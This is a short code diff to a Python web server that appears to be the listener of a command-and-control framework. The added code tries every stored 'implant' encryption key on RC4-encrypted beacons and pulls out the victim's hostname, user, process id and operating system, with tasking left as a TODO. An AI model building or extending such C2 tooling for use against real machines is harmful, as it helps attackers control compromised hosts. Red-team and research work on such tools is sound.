@@ -111,6 +111,35 @@ class WebServer(object):
 
         # else RC4 encrypted beacon
         else:
+            # queries all encryption keys from the "implants" table
+            with self.connection:
+                cursor = self.connection.cursor()
+                cursor.execute("SELECT encryption_key FROM implants")
+                results = cursor.fetchall()
+
+                # loops through each encryption key
+                # tries to decrypt using each key
+                for row in results:
+                    # if successful decryption
+                    if "hostname" in self.crypt(row[0], raw_data):
+                        # JSON decodes POST data
+                        j = json.loads(self.crypt(row[0], raw_data))
+
+                        hostname = j["hostname"]
+                        current_user = j["current_user"]
+                        process_id = j["process_id"]
+                        operating_system = j["operating_system"]
+
+                        # DEBUGGING
+                        print(hostname)
+                        print(current_user)
+                        print(process_id)
+                        print(operating_system)
+
+                        # TO DO: updates last_beacon time in "implants" table
+
+                        # TO DO: checks for tasking
+
             return "RC4 beacon"
 
     def start_flask_server(self, protocol, external_address, port, profile):
